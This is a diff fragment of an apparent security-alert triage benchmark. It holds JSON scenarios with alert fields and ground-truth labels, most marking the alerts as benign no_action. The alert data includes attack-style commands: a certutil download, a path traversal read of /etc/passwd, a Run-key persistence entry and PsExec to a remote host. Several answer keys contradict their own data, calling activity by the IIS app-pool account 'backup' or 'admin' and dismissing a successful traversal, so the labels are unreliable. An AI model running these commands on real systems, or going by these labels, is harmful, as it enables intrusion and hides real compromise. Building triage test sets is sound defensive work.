+          "timestamp": "2026-09-27T01:25:00Z",
+          "src_ip": "192.168.56.30",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.30 -> 192.168.56.20:80 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:25:00Z",
+              "end": "2026-09-27T01:25:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-026:n2",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:26:00Z",
+          "src_ip": "192.168.56.30",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.30 -> 192.168.56.20:443 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:26:00Z",
+              "end": "2026-09-27T01:26:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1046",
+          "T1595"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "IP 192.168.56.30 là it_scanner trong inventory — quét định kỳ hợp lệ. Rule C03 gán medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-027",
+      "name": "LB monitor health check (báo nhầm)",
+      "alerts": [
+        {
+          "alert_id": "v2-027:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:27:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.5 -> 192.168.56.20:80 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:27:00Z",
+              "end": "2026-09-27T01:27:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-027:n2",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:28:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.5 -> 192.168.56.20:443 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:28:00Z",
+              "end": "2026-09-27T01:28:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-027:n3",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:29:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 8080,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.5 -> 192.168.56.20:8080 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:29:00Z",
+              "end": "2026-09-27T01:29:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1046",
+          "T1595"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "IP 192.168.56.5 là lb_monitor — health check định kỳ. Rule C03 gán medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-028",
+      "name": "Admin chạy whoami /priv giờ hành chính",
+      "alerts": [
+        {
+          "alert_id": "v2-028:e1",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:30:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "DOMAIN\\admin dùng admin tools giờ hành chính (inventory note). Rule B16 gán high; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-029",
+      "name": "Admin chạy systeminfo",
+      "alerts": [
+        {
+          "alert_id": "v2-029:e1",
+          "rule_name": "Suspicious Execution of Systeminfo",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1082"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:31:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Execution of Systeminfo |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\systeminfo.exe",
+            "OriginalFileName": "sysinfo.exe",
+            "CommandLine": "systeminfo.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6125",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1082"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": true,
+        "reason": "DOMAIN\\admin — systeminfo là hoạt động admin bình thường. Rule B17 gán low; đáp án khớp mức luật."
+      }
+    },
+    {
+      "id": "v2-030",
+      "name": "Admin chạy PsExec tới host quản trị",
+      "alerts": [
+        {
+          "alert_id": "v2-030:e1",
+          "rule_name": "Psexec Execution",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1569",
+            "T1021"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:32:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Psexec Execution |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Users\\Public\\psexec.exe",
+            "OriginalFileName": "psexec.c",
+            "CommandLine": "psexec.exe -accepteula \\\\192.168.56.50 cmd.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6130",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1569",
+          "T1021"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "PsExec bởi DOMAIN\\admin — script quản trị (FP ghi trong rule B22). Rule gán medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-031",
+      "name": "Admin tạo schtasks định kỳ",
+      "alerts": [
+        {
+          "alert_id": "v2-031:e1",
+          "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:33:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Creation Via Schtasks.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn AdminTask /tr C:\\Scripts\\task.bat /sc daily /st 02:00",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6127",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": true,
+        "reason": "schtasks bởi admin — quản trị định kỳ. Rule B19 low; đáp án khớp mức luật."
+      }
+    },
+    {
+      "id": "v2-032",
+      "name": "Backup service tạo scheduled task ban đêm",
+      "alerts": [
+        {
+          "alert_id": "v2-032:e1",
+          "rule_name": "Scheduled Task Creation Via Schtasks.EXE",
+          "rule_level": "low",
+          "attack_ids": [
+            "T1053.005"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:34:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Scheduled Task Creation Via Schtasks.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\schtasks.exe",
+            "CommandLine": "schtasks.exe /create /tn BackupNightly /tr C:\\Scripts\\backup.bat /sc daily /st 02:00",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\backup",
+            "ProcessId": "6127",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1053.005"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": true,
+        "reason": "DOMAIN\\backup — tạo nightly task là hoạt động bình thường (inventory). Rule B19 đã là low; đáp án khớp mức luật — ca Splunk ĐÚNG, dùng làm baseline."
+      }
+    },
+    {
+      "id": "v2-033",
+      "name": "Admin reg add Run key",
+      "alerts": [
+        {
+          "alert_id": "v2-033:e1",
+          "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1547.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:35:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Potential Persistence Attempt Via Run Keys Using Reg.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v X /d C:\\temp\\x.exe",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6129",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1547.001"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Admin thêm Run key — quản trị. Rule B21 gán medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-034",
+      "name": "Admin chạy PowerShell Invoke-WebRequest",
+      "alerts": [
+        {
+          "alert_id": "v2-034:e1",
+          "rule_name": "Usage Of Web Request Commands And Cmdlets",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1059.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:36:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Usage Of Web Request Commands And Cmdlets |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+            "CommandLine": "powershell.exe Invoke-WebRequest -Uri https://update.microsoft.com",
+            "ParentImage": "C:\\Windows\\explorer.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6501",
+            "ParentProcessId": "5000"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1059.001"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Admin dùng PS web request để update — rule B11 medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-035",
+      "name": "Backup chạy certutil download",
+      "alerts": [
+        {
+          "alert_id": "v2-035:e1",
+          "rule_name": "Suspicious Download Via Certutil.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1027",
+            "T1105"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:37:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Download Via Certutil.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\certutil.exe",
+            "OriginalFileName": "CertUtil.exe",
+            "CommandLine": "certutil.exe -urlcache -split -f http://internal-backup.local/pkg.zip C:\\temp\\pkg.zip",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6220",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1027",
+          "T1105"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "certutil trong ngữ cảnh backup nội bộ — rule B12 medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-036",
+      "name": "Loop scan từ context quét định kỳ",
+      "alerts": [
+        {
+          "alert_id": "v2-036:e1",
+          "rule_name": "Suspicious Scan Loop Network",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1059",
+            "T1018"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:38:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Suspicious Scan Loop Network |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\cmd.exe",
+            "CommandLine": "for i in 1 2 3 4 5; do ping 192.168.56.$i; done",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6126",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1059",
+          "T1018"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Loop scan từ máy admin — rule B18 medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-037",
+      "name": "Admin chạy whoami /priv 2 lần cách 30s",
+      "alerts": [
+        {
+          "alert_id": "v2-037:e1",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:39:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-037:e2",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:39:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\admin",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1033"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Admin chạy whoami 2 lần cách 30s — vẫn là hành vi admin. Rule B16 high; thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-038",
+      "name": "Backup chạy B21 reg add Run key",
+      "alerts": [
+        {
+          "alert_id": "v2-038:e1",
+          "rule_name": "Potential Persistence Attempt Via Run Keys Using Reg.EXE",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1547.001"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:40:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Potential Persistence Attempt Via Run Keys Using Reg.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\reg.exe",
+            "CommandLine": "reg.exe add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v Backup /d C:\\Scripts\\backup.bat",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "DOMAIN\\backup",
+            "ProcessId": "6129",
+            "ParentProcessId": "6120"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1547.001"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Backup thêm Run key cho script riêng — rule B21 medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-039",
+      "name": "LB monitor Suricata scan từ 192.168.56.5",
+      "alerts": [
+        {
+          "alert_id": "v2-039:n1",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:41:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 9100,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.5 -> 192.168.56.20:9100 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:41:00Z",
+              "end": "2026-09-27T01:41:00Z"
+            }
+          }
+        },
+        {
+          "alert_id": "v2-039:n2",
+          "rule_name": "AegisSOC - Suricata Network Scan Alert",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1046",
+            "T1595"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:42:00Z",
+          "src_ip": "192.168.56.5",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 9200,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Suricata Network Scan Alert | 192.168.56.5 -> 192.168.56.20:9200 | host=sensor-net-01",
+          "fields": {
+            "event_type": "alert",
+            "proto": "TCP",
+            "app_proto": "failed",
+            "alert": {
+              "signature": "ET SCAN Possible TCP Port Scan",
+              "signature_id": 2001219,
+              "category": "Attempted Information Leak"
+            },
+            "flow": {
+              "pkts_toserver": 1,
+              "pkts_toclient": 0,
+              "bytes_toserver": 60,
+              "bytes_toclient": 0,
+              "start": "2026-09-27T01:42:00Z",
+              "end": "2026-09-27T01:42:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1046",
+          "T1595"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "LB monitor kiểm tra port 9100/9200 (node-exporter) — hợp lệ. Rule C03 medium; thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-040",
+      "name": "IT scanner B02 path traversal do scanner nhầm",
+      "alerts": [
+        {
+          "alert_id": "v2-040:w1",
+          "rule_name": "Path Traversal Exploitation Attempts",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1190"
+          ],
+          "surface": "web",
+          "timestamp": "2026-09-27T01:43:00Z",
+          "src_ip": "192.168.56.30",
+          "dest_ip": "192.168.56.20",
+          "dest_port": 80,
+          "host": "proxy01",
+          "summary": "Path Traversal Exploitation Attempts | 192.168.56.30 -> 192.168.56.20:80 | host=proxy01",
+          "fields": {
+            "method": "GET",
+            "uri": "/download?file=../../../etc/passwd",
+            "status": "200",
+            "http_user_agent": "Mozilla/5.0",
+            "http_host": "192.168.56.20",
+            "http_referer": "",
+            "body_bytes_sent": "896"
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1190"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Scanner IT thử path traversal là 1 bước scan định kỳ (FP ghi trong B02). Rule gán medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-061",
+      "name": "Backup định kỳ đẩy 60 MB ra external storage",
+      "alerts": [
+        {
+          "alert_id": "v2-061:n1",
+          "rule_name": "AegisSOC - Large Outbound Transfer From Web Server",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1041",
+            "T1048"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:44:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.50",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Large Outbound Transfer From Web Server | 192.168.56.20 -> 203.0.113.50:443 | host=sensor-net-01",
+          "fields": {
+            "event_type": "flow",
+            "proto": "TCP",
+            "app_proto": "tls",
+            "src_ip": "192.168.56.20",
+            "dest_ip": "203.0.113.50",
+            "flow": {
+              "pkts_toserver": 5000,
+              "pkts_toclient": 5000,
+              "bytes_toserver": 62000000,
+              "bytes_toclient": 5000000,
+              "start": "2026-09-27T01:44:00Z",
+              "end": "2026-09-27T01:44:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1041",
+          "T1048"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Backup job đẩy 60 MB ra external. Khớp C01 (FP ghi trong rule: 'Backups or software updates pushed to external storage'). Rule C01 medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-062",
+      "name": "Update phần mềm đẩy dữ liệu lớn (báo nhầm)",
+      "alerts": [
+        {
+          "alert_id": "v2-062:n1",
+          "rule_name": "AegisSOC - Large Outbound Transfer From Web Server",
+          "rule_level": "medium",
+          "attack_ids": [
+            "T1041",
+            "T1048"
+          ],
+          "surface": "network",
+          "timestamp": "2026-09-27T01:45:00Z",
+          "src_ip": "192.168.56.20",
+          "dest_ip": "203.0.113.60",
+          "dest_port": 443,
+          "host": "sensor-net-01",
+          "summary": "AegisSOC - Large Outbound Transfer From Web Server | 192.168.56.20 -> 203.0.113.60:443 | host=sensor-net-01",
+          "fields": {
+            "event_type": "flow",
+            "proto": "TCP",
+            "app_proto": "tls",
+            "src_ip": "192.168.56.20",
+            "dest_ip": "203.0.113.60",
+            "flow": {
+              "pkts_toserver": 5000,
+              "pkts_toclient": 5000,
+              "bytes_toserver": 85000000,
+              "bytes_toclient": 5000000,
+              "start": "2026-09-27T01:45:00Z",
+              "end": "2026-09-27T01:45:00Z"
+            }
+          }
+        }
+      ],
+      "ground_truth": {
+        "is_attack": false,
+        "severity": "low",
+        "attack_ids": [
+          "T1041",
+          "T1048"
+        ],
+        "correct_action": "no_action",
+        "siem_correct": false,
+        "reason": "Software update server đẩy 85 MB ra external. Cũng là FP ghi trong C01. Rule gán medium; tình huống thực tế low/no_action."
+      }
+    },
+    {
+      "id": "v2-041",
+      "name": "5 whoami /priv liên tiếp trong 2 phút",
+      "alerts": [
+        {
+          "alert_id": "v2-041:e1",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:44:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-041:e2",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:44:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-041:e3",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:45:00Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
+            "User": "IIS APPPOOL\\DefaultAppPool",
+            "ProcessId": "6124",
+            "ParentProcessId": "6120"
+          }
+        },
+        {
+          "alert_id": "v2-041:e4",
+          "rule_name": "Security Privileges Enumeration Via Whoami.EXE",
+          "rule_level": "high",
+          "attack_ids": [
+            "T1033"
+          ],
+          "surface": "endpoint",
+          "timestamp": "2026-09-27T01:45:30Z",
+          "src_ip": "",
+          "dest_ip": "",
+          "dest_port": null,
+          "host": "web-win-01",
+          "summary": "Security Privileges Enumeration Via Whoami.EXE |  -> :None | host=web-win-01",
+          "fields": {
+            "EventCode": "1",
+            "ComputerName": "web-win-01",
+            "Image": "C:\\Windows\\System32\\whoami.exe",
+            "OriginalFileName": "whoami.exe",
+            "CommandLine": "whoami.exe /priv",
+            "ParentImage": "C:\\Windows\\System32\\cmd.exe",
